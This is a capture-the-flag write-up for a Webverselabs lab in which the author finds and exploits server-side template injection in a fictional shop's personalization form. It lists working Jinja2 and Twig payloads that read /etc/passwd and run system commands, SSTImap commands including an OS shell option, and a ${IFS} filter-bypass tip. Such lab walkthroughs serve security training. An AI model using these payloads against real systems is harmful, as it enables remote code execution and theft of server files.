---
title: "Webverselabs BlockPixel Goods Challenge SSTI "
date: 2026-05-20 00:00:00 +0000
categories: [Webverselabs]
tags: [Webverselabs , Easy , Challenge , Web_Attacks ]
---



## Scenario : 

BlockPixel Goods is Maya, Theo, and Reese — three friends who met at a craft fair in Portland in 2022 and started selling pixel-art hoodies from a garage. They graduated to a real shop in 2024 and added the "Make It Yours" personalization flow last spring, when a customer asked if she could put her Minecraft realm's name on a tote bag for her sister. Maya wired the preview page up in an afternoon.


## Solution : 

<img width="1674" height="807" alt="image" src="https://github.com/user-attachments/assets/22d4ea72-305f-4b19-a00d-484852c43ce5" />

We first start by browsing the app just like a normal user, view the different endpoints, features and request made to the server . We're mainly looking for parameters whether it be inside a GET request in the URL , or inside the Body of a POST Request.

**/Shop :**

<img width="1623" height="832" alt="image" src="https://github.com/user-attachments/assets/a82dd32c-12df-403b-830b-b78836c100c3" />

This is just a list of designs that we can buy, if we click on any of them , we have the possibility to add them to our cart or make them ours : 

<img width="1510" height="764" alt="image" src="https://github.com/user-attachments/assets/2bee21af-eba2-4d3c-84a3-e3b2b65e61c2" />

**/Make it yours :**

<img width="1357" height="814" alt="image" src="https://github.com/user-attachments/assets/c96785e4-ef1f-4f4b-b52d-c70e5218e9e7" />

If we click on Make it yours we're redirected to this page , where we can add a Tag and a Slogan let's first make a normal Request and check it on Burp to understand it better : 

<img width="1552" height="723" alt="image" src="https://github.com/user-attachments/assets/f43f4dfd-30a0-4c6d-917a-13bf49347385" />

We see that this sends a POST request with the 2 parameters we specified , but both of them are reflected back to us , this can be an indicator that a ServerSide template it being used .

Templates are used to dynamically render content by injecting variables into HTML pages . BUT when user input is embedded directly into them without sanitization, it leads to SSTI (Server-Side Template Injection), a vulnerability that allows an attacker to inject and run malicious code on the server.

I already have a detailed section on my Web_App methdology for SSTI injections that i will be following : 

```bash
https://elmehdilaassiri.github.io/posts/web-app-pentesting-methodology/#ssti-
```

{% raw %}
```bash
# Detection payload:
${7*7}
{{7*7}}
# Follow this graph to identify the engine:
# https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/
```
{% endraw %}
**Exploitation : Jinja2**
{% raw %}
```python
# 1/ Information Disclosure :
{{ config.items() }}
{{ self.__init__.__globals__.__builtins__ }}

# 2/ LFI :
{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}

# 3/ RCE :
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

**Exploitation : Twig**

```php
# 1/ Information Disclosure :
{{ _self }}

# 2/ LFI :
{{ "/etc/passwd"|file_excerpt(1,-1) }}

# 3/ RCE :
{{ ['id'] | filter('system') }}
```
{% endraw %}


**Automation :**

```bash
git clone https://github.com/vladko312/SSTImap
cd SSTImap
pip3 install -r requirements.txt
python3 sstimap.py
python3 sstimap.py -u http://172.17.0.2/index.php?name=test
python3 sstimap.py -u http://172.17.0.2/index.php?name=test -D '/etc/passwd' './passwd'
python3 sstimap.py -u http://172.17.0.2/index.php?name=test -S id
python3 sstimap.py -u http://172.17.0.2/index.php?name=test --os-shell
```

Now first i injected a simple payload 7*7 and based on the response we would know wether or not our code was executed and if we have an SSTI or not , if we get 49 rendered to us this means we got our code executed . 

After that based on the Response we get from the server , we would know which Engine is being used . We will follow this diagram from Payload All the Things . 

<img width="1094" height="475" alt="image" src="https://github.com/user-attachments/assets/abaec2d0-5ba9-44cc-89c9-d6997cfe14bd" />

Now back to our Burp request : 

<img width="1590" height="722" alt="image" src="https://github.com/user-attachments/assets/9f7a8623-754a-4ad4-b050-d9ac9d97f5e7" />

Perfect we can see that our code was executed , which means the slogan parameter was indeed vulnerable to an SSTI . 

From there i decided to inject Jinja payload to save some time , if we get an error we can move to the twig payloads : 

<img width="1561" height="741" alt="image" src="https://github.com/user-attachments/assets/d2f02fed-21ed-4778-a6f8-1c30721cdceb" />

Perfect this confirms that the template used is indeed Jinja , now we can try the RCE payload :

<img width="1488" height="711" alt="image" src="https://github.com/user-attachments/assets/ed316614-9a4b-485d-a1a2-232d159ee920" />

Perfect now we just read the flag , if you get a problem with spaces just replace them with ${IFS} :

<img width="1577" height="711" alt="image" src="https://github.com/user-attachments/assets/0e3a7381-24cd-4abd-b484-0344bcc56cdf" />

We can also try the LFI payloads and read the flag that way : 

<img width="1526" height="689" alt="image" src="https://github.com/user-attachments/assets/1bf0aa91-b26d-478f-a643-2cfba08fd4ee" />

Just specify the path for the flag which is /flag.txt and you should get your flag. 

That was all for this challenge, see you in the next one :) 
